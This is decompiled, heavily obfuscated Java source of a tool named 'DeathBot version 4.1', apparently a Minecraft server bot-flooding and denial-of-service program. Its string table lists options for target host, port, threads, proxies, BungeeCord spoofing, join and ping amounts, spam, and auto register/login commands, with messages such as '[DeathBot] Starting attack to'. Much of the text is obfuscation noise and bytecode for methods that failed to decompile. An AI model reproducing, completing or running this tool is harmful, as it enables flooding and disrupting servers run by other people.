                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 37))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "{Sp%HHUz0a\u0000Da%NT~{#\u001cAca%_K7a+\u001c";
                    n56 = 36;
                    continue Label_0988_Outer;
                }
                case 36: {
                    array[n38] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 38))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "{Sp%HHUz0a\u0000Da+LPrqd]Tct'W\u0000czd";
                    n56 = 37;
                    continue Label_0988_Outer;
                }
                case 37: {
                    array[n39] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 39))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "eoe!_Trqd]Rp5%ZTrg~\u001c";
                    n56 = 38;
                    continue Label_0988_Outer;
                }
                case 38: {
                    array[n40] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 40))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "Dx`&PE}";
                    n56 = 39;
                    continue Label_0988_Outer;
                }
                case 39: {
                    array[n41] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 41))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "Jvc%\u0012Uc|(\u0012aeg%ES9`7Ylrr%_YZp6[EDz6H";
                    n56 = 40;
                    continue Label_0988_Outer;
                }
                case 40: {
                    array[n42] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 42))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "Te`!";
                    n56 = 41;
                    continue Label_0988_Outer;
                }
                case 41: {
                    array[n43] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 43))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "Age(UCva-SN8q*O\r}f+R";
                    n56 = 42;
                    continue Label_0988_Outer;
                }
                case 42: {
                    array[n44] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 44))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "Dva%";
                    n56 = 43;
                    continue Label_0988_Outer;
                }
                case 43: {
                    array[n45] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 45))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "\u0006cl4Y\u001dV";
                    n56 = 44;
                    continue Label_0988_Outer;
                }
                case 44: {
                    array[n46] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 46))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "ayf3YR";
                    n56 = 45;
                    continue Label_0988_Outer;
                }
                case 45: {
                    array[n47] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 47))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "atv!LT";
                    n56 = 46;
                    continue Label_0988_Outer;
                }
                case 46: {
                    array[n48] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 48))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "Hca4O\u001a8:u\u0012\u00119$j\r\u000fs{7\u0011Qbp6E\u001fyt)Y\u001d";
                    n56 = 47;
                    continue Label_0988_Outer;
                }
                case 47: {
                    array[n49] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 49))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "hXY\u0000\u001coY4";
                    n56 = 48;
                    continue Label_0988_Outer;
                }
                case 48: {
                    array[n50] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 50))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "Hca4O\u001a8:u\u0012\u00119$j\r\u000fs{7\u0011Qbp6E\u001fyt)Y\u001dHx-REtg%ZT9J0_P9";
                    n56 = 49;
                    continue Label_0988_Outer;
                }
                case 49: {
                    array[n51] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 51))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "\u0006cl4Y\u001dDG\u0012";
                    n56 = 50;
                    continue Label_0988_Outer;
                }
                case 50: {
                    array[n52] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 52))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "\t9a<H";
                    n56 = 51;
                    continue Label_0988_Outer;
                }
                case 51: {
                    array[n53] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 53))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "\u000ecm0";
                    n56 = 52;
                    continue Label_0988_Outer;
                }
                case 52: {
                    array[n54] = intern;
                    n = (n2 = (n3 = (n4 = (n5 = (n6 = (n7 = (n8 = (n9 = (n10 = (n11 = (n12 = (n13 = (n14 = (n15 = (n16 = (n17 = (n18 = (n19 = (n20 = (n21 = (n22 = (n23 = (n24 = (n25 = (n26 = (n27 = (n28 = (n29 = (n30 = (n31 = (n32 = (n33 = (n34 = (n35 = (n36 = (n37 = (n38 = (n39 = (n40 = (n41 = (n42 = (n43 = (n44 = (n45 = (n46 = (n47 = (n48 = (n49 = (n50 = (n51 = (n52 = (n53 = (n54 = (n55 = 54))))))))))))))))))))))))))))))))))))))))))))))))))))));
                    s = "Ynl=\u0011mZ8 X\u0000_]~QM-f7";
                    n56 = 53;
                    continue Label_0988_Outer;
                }
                case 53: {
                    break Label_0988_Outer;
                }
            }
        }
        array[n55] = intern;
        z = new String[] { "\\.", "nicksize", "stay", "port", "premium", "Welcome to DeathBot version 4.1", " is not a valid address", "proxymode", "This server is blocked!", "username", "/login 123456789", "login", "/register 123456789 123456789", "nicks", "msg", "amount", "stayl", "nicksurl", "pingamount", " using protocol ", "log", "proxytries", "move", "ach", "[DeathBot] Found SRV domain, real address is ", "time", "joinamount", "ping", "proxyupdate", "threads", "protocol", "bungeespoof", "Not a valid argument: ", "host", "spam", "register", "debug", "[DeathBot] Starting attack to ", "[DeathBot] Stopped attack to ", "Expected arg after: ", "doublej", "java.util.Arrays.useLegacyMergeSort", "true", "application/dns-json", "data", "&type=A", "Answer", "Accept", "https://1.1.1.1/dns-query?name=", "HOLD ON!", "https://1.1.1.1/dns-query?name=_minecraft._tcp.", "&type=SRV", ").txt", ".txt", "yyyy-MM-dd HH:mm:ss" };
        Bot.b = new bb().a().b();
        Bot.c = false;
    }
    
    public static void main(final String[] array) {
        final boolean j = Bot.j;
        boolean i = false;
        Label_0041: {
            Label_0035: {
                try {
                    System.setProperty("java.util.Arrays.useLegacyMergeSort", "true");
                    new Bot(array);
                    if (!nb.a) {
                        return;
                    }
                    final boolean b = j;
                    if (b) {
                        break Label_0035;
                    }
                    break Label_0035;
                }
                catch (IllegalArgumentException ex) {
                    throw ex;
                }
                try {
                    final boolean b = j;
                    if (b) {
                        i = false;
                        break Label_0041;
                    }
                }
                catch (IllegalArgumentException ex2) {
                    throw ex2;
                }
            }
            i = true;
        }
        Bot.j = i;
    }
    
    private void a() {
        new Thread(new e(this)).start();
    }
    
    private void a(final String s) {
        throw new IllegalStateException();
    }
    
    public Bot(final String[] p0) {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     3: istore_3       
        //     4: aload_0        
        //     5: invokespecial   java/lang/Object.<init>:()V
        //     8: aload_0        
        //     9: invokespecial   de/me/death/Bot.a:()V
        //    12: aload_0        
        //    13: putstatic       de/me/death/Bot.a:Lde/me/death/Bot;
        //    16: aload_0        
        //    17: new             Lde/me/death/j;
        //    20: dup            
        //    21: invokespecial   de/me/death/j.<init>:()V
        //    24: putfield        de/me/death/Bot.d:Lde/me/death/j;
        //    27: aload_0        
        //    28: new             Lde/me/death/z;
        //    31: dup            
        //    32: invokespecial   de/me/death/z.<init>:()V
        //    35: putfield        de/me/death/Bot.e:Lde/me/death/z;
        //    38: aload_0        
        //    39: new             Lde/me/death/i;
        //    42: dup            
        //    43: aload_0        
        //    44: invokespecial   de/me/death/i.<init>:(Lde/me/death/Bot;)V
        //    47: putfield        de/me/death/Bot.g:Lde/me/death/i;
        //    50: aload_0        
        //    51: getfield        de/me/death/Bot.e:Lde/me/death/z;
        //    54: ldc2_w          4.1
        //    57: pop2           
        //    58: pop            
        //    59: nop            
        //    60: nop            
        //    61: iconst_1       
        //    62: iload_3        
        //    63: ifne            83
        //    66: ifne            81
        //    69: goto            73
        //    72: athrow         
        //    73: nop            
        //    74: nop            
        //    75: nop            
        //    76: nop            
        //    77: goto            81
        //    80: athrow         
        //    81: aload_1        
        //    82: arraylength    
        //    83: ifle            118
        //    86: aload_0        
        //    87: aload_1        
        //    88: invokespecial   de/me/death/Bot.a:([Ljava/lang/String;)V
        //    91: iload_3        
        //    92: ifeq            122
        //    95: goto            99
        //    98: athrow         
        //    99: getstatic       uiztfzghuzt/nb.a:Z
        //   102: ifeq            114
        //   105: goto            109
        //   108: athrow         
        //   109: iconst_0       
        //   110: goto            115
        //   113: athrow         
        //   114: iconst_1       
        //   115: putstatic       uiztfzghuzt/nb.a:Z
        //   118: aload_0        
        //   119: invokespecial   de/me/death/Bot.b:()V
        //   122: return         
        //    StackMapTable: 00 0E FF 00 48 00 04 07 00 02 07 01 4E 00 01 00 01 07 01 54 00 46 07 01 54 00 41 01 4E 07 01 54 00 48 07 01 54 00 43 07 01 54 00 40 01 02 03
        //    Exceptions:
        //  Try           Handler
        //  Start  End    Start  End    Type                                
        //  -----  -----  -----  -----  ------------------------------------
        //  99     113    113    114    Ljava/lang/IllegalArgumentException;
        //  86     105    108    109    Ljava/lang/IllegalArgumentException;
        //  83     95     98     99     Ljava/lang/IllegalArgumentException;
        //  66     77     80     81     Ljava/lang/IllegalArgumentException;
        //  60     69     72     73     Ljava/lang/IllegalArgumentException;
        // 
        // The error that occurred was:
        // 
        // java.lang.IllegalStateException: Expression is linked from several locations: Label_0099:
        //     at com.strobel.decompiler.ast.Error.expressionLinkedFromMultipleLocations(Error.java:27)
        //     at com.strobel.decompiler.ast.AstOptimizer.mergeDisparateObjectInitializations(AstOptimizer.java:2596)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:235)
        //     at com.strobel.decompiler.ast.AstOptimizer.optimize(AstOptimizer.java:42)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:214)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:782)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createConstructor(AstBuilder.java:713)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:549)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:519)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:161)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:150)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:125)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:330)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:251)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:126)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    private void b() {
        SwingUtilities.invokeLater(new f(this));
    }
    
    private void a(final String... p0) {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     3: istore          38
        //     5: new             Ljava/util/ArrayList;
        //     8: dup            
        //     9: invokespecial   java/util/ArrayList.<init>:()V
        //    12: astore_2       
        //    13: new             Ljava/util/HashMap;
        //    16: dup            
        //    17: invokespecial   java/util/HashMap.<init>:()V
        //    20: astore_3       
        //    21: new             Ljava/util/ArrayList;
        //    24: dup            
        //    25: invokespecial   java/util/ArrayList.<init>:()V
        //    28: astore          4
        //    30: iconst_0       
        //    31: istore          5
        //    33: iload           38
        //    35: ifeq            322
        //    38: aload_1        
        //    39: iload           5
        //    41: aaload         
        //    42: iconst_0       
        //    43: invokevirtual   java/lang/String.charAt:(I)C
        //    46: iload           38
        //    48: ifne            318
        //    51: goto            55
        //    54: athrow         
        //    55: tableswitch {
        //               90: 72
        //          default: 308
        //        }
        //    72: aload_1        
        //    73: iload           5
        //    75: aaload         
        //    76: invokevirtual   java/lang/String.length:()I
        //    79: iconst_2       
        //    80: iload           38
        //    82: ifne            130
        //    85: if_icmpge       120
        //    88: goto            92
        //    91: athrow         
        //    92: new             Ljava/lang/IllegalArgumentException;
        //    95: dup            
        //    96: new             Ljava/lang/StringBuilder;
        //    99: dup            
        //   100: ldc             "Not a valid argument: "
        //   102: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   105: aload_1        
        //   106: iload           5
        //   108: aaload         
        //   109: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   112: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   115: invokespecial   java/lang/IllegalArgumentException.<init>:(Ljava/lang/String;)V
        //   118: athrow         
        //   119: athrow         
        //   120: aload_1        
        //   121: iload           5
        //   123: aaload         
        //   124: iconst_1       
        //   125: invokevirtual   java/lang/String.charAt:(I)C
        //   128: bipush          45
        //   130: iload           38
        //   132: ifne            241
        //   135: if_icmpne       222
        //   138: goto            142
        //   141: athrow         
        //   142: aload_1        
        //   143: iload           5
        //   145: aaload         
        //   146: invokevirtual   java/lang/String.length:()I
        //   149: iload           38
        //   151: ifne            216
        //   154: goto            158
        //   157: athrow         
        //   158: iconst_3       
        //   159: if_icmpge       194
        //   162: goto            166
        //   165: athrow         
        //   166: new             Ljava/lang/IllegalArgumentException;
        //   169: dup            
        //   170: new             Ljava/lang/StringBuilder;
        //   173: dup            
        //   174: ldc             "Not a valid argument: "
        //   176: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   179: aload_1        
        //   180: iload           5
        //   182: aaload         
        //   183: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   186: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   189: invokespecial   java/lang/IllegalArgumentException.<init>:(Ljava/lang/String;)V
        //   192: athrow         
        //   193: athrow         
        //   194: aload           4
        //   196: aload_1        
        //   197: iload           5
        //   199: aaload         
        //   200: iconst_2       
        //   201: aload_1        
        //   202: iload           5
        //   204: aaload         
        //   205: invokevirtual   java/lang/String.length:()I
        //   208: invokevirtual   java/lang/String.substring:(II)Ljava/lang/String;
        //   211: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   216: pop            
        //   217: iload           38
        //   219: ifeq            319
        //   222: aload_1        
        //   223: iload           38
        //   225: ifne            299
        //   228: goto            232
        //   231: athrow         
        //   232: arraylength    
        //   233: iconst_1       
        //   234: isub           
        //   235: iload           5
        //   237: goto            241
        //   240: athrow         
        //   241: if_icmpne       273
        //   244: new             Ljava/lang/IllegalArgumentException;
        //   247: dup            
        //   248: new             Ljava/lang/StringBuilder;
        //   251: dup            
        //   252: ldc_w           "Expected arg after: "
        //   255: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   258: aload_1        
        //   259: iload           5
        //   261: aaload         
        //   262: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   265: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   268: invokespecial   java/lang/IllegalArgumentException.<init>:(Ljava/lang/String;)V
        //   271: athrow         
        //   272: athrow         
        //   273: aload_3        
        //   274: aload_1        
        //   275: iload           5
        //   277: aaload         
        //   278: ldc_w           "-"
        //   281: ldc_w           ""
        //   284: invokevirtual   java/lang/String.replace:(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
        //   287: invokevirtual   java/lang/String.toLowerCase:()Ljava/lang/String;
        //   290: aload_1        
        //   291: iload           5
        //   293: iconst_1       
        //   294: iadd           
        //   295: aaload         
        //   296: invokevirtual   java/util/HashMap.put:(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
        //   299: pop            
        //   300: iinc            5, 1
        //   303: iload           38
        //   305: ifeq            319
        //   308: aload_2        
        //   309: aload_1        
        //   310: iload           5
        //   312: aaload         
        //   313: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   318: pop            
        //   319: iinc            5, 1
        //   322: iload           5
        //   324: aload_1        
        //   325: arraylength    
        //   326: if_icmplt       38
        //   329: iload           38
        //   331: ifne            72
        //   334: aconst_null    
        //   335: astore          5
        //   337: ldc_w           ""
        //   340: astore          6
        //   342: sipush          25565
        //   345: istore          7
        //   347: getstatic       de/me/death/d.P4:Lde/me/death/d;
        //   350: astore          8
        //   352: iconst_0       
        //   353: istore          9
        //   355: iconst_0       
        //   356: istore          10
        //   358: iconst_0       
        //   359: istore          11
        //   361: getstatic       de/me/death/c.RANDOM:Lde/me/death/c;
        //   364: astore          12
        //   366: iconst_0       
        //   367: istore          13
        //   369: iconst_0       
        //   370: istore          14
        //   372: iconst_0       
        //   373: istore          15
        //   375: iconst_0       
        //   376: istore          16
        //   378: iconst_2       
        //   379: istore          17
        //   381: iconst_1       
        //   382: istore          18
        //   384: ldc_w           ""
        //   387: astore          19
        //   389: aconst_null    
        //   390: astore          20
        //   392: iconst_0       
        //   393: istore          21
        //   395: iconst_0       
        //   396: istore          22
        //   398: ldc_w           ""
        //   401: astore          23
        //   403: iconst_0       
        //   404: istore          24
        //   406: iconst_0       
        //   407: istore          25
        //   409: bipush          15
        //   411: istore          26
        //   413: getstatic       de/me/death/b.BOTH:Lde/me/death/b;
        //   416: astore          27
        //   418: ldc             "/login 123456789"
        //   420: astore          28
        //   422: ldc             "/register 123456789 123456789"
        //   424: astore          29
        //   426: lconst_0       
        //   427: lstore          30
        //   429: aload_3        
        //   430: ldc             "proxyupdate"
        //   432: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   435: iload           38
        //   437: ifne            467
        //   440: ifeq            461
        //   443: goto            447
        //   446: athrow         
        //   447: aload_3        
        //   448: ldc             "proxyupdate"
        //   450: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   453: checkcast       Ljava/lang/String;
        //   456: invokestatic    java/lang/Boolean.parseBoolean:(Ljava/lang/String;)Z
        //   459: istore          24
        //   461: aload_3        
        //   462: ldc             "host"
        //   464: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   467: iload           38
        //   469: ifne            496
        //   472: ifeq            490
        //   475: goto            479
        //   478: athrow         
        //   479: aload_3        
        //   480: ldc             "host"
        //   482: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   485: checkcast       Ljava/lang/String;
        //   488: astore          6
        //   490: aload_3        
        //   491: ldc             "port"
        //   493: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   496: iload           38
        //   498: ifne            528
        //   501: ifeq            522
        //   504: goto            508
        //   507: athrow         
        //   508: aload_3        
        //   509: ldc             "port"
        //   511: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   514: checkcast       Ljava/lang/String;
        //   517: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //   520: istore          7
        //   522: aload_3        
        //   523: ldc             "proxytries"
        //   525: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   528: iload           38
        //   530: ifne            569
        //   533: ifeq            563
        //   536: goto            540
        //   539: athrow         
        //   540: aload_0        
        //   541: getfield        de/me/death/Bot.d:Lde/me/death/j;
        //   544: aload_3        
        //   545: ldc             "proxytries"
        //   547: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   550: checkcast       Ljava/lang/String;
        //   553: invokestatic    java/lang/Integer.parseInt:(Ljava/lang/String;)I
        //   556: invokevirtual   de/me/death/j.a:(I)V
        //   559: goto            563
        //   562: athrow         
        //   563: aload_3        
        //   564: ldc             "nicksurl"
        //   566: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   569: iload           38
        //   571: ifne            611
        //   574: ifeq            605
        //   577: goto            581
        //   580: athrow         
        //   581: new             Ljava/lang/StringBuilder;
        //   584: dup            
        //   585: aload_3        
        //   586: ldc             "nicksurl"
        //   588: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
        //   591: checkcast       Ljava/lang/String;
        //   594: invokestatic    java/lang/String.valueOf:(Ljava/lang/Object;)Ljava/lang/String;
        //   597: invokespecial   java/lang/StringBuilder.<init>:(Ljava/lang/String;)V
        //   600: invokevirtual   java/lang/StringBuilder.toString:()Ljava/lang/String;
        //   603: astore          19
        //   605: aload_3        
        //   606: ldc             "nicksize"
        //   608: invokevirtual   java/util/HashMap.containsKey:(Ljava/lang/Object;)Z
        //   611: iload           38
        //   613: ifne            643
        //   616: ifeq            637
        //   619: goto            623
        //   622: athrow         
        //   623: aload_3        
        //   624: ldc             "nicksize"
        //   626: invokevirtual   java/util/HashMap.get:(Ljava/lang/Object;)Ljava/lang/Object;
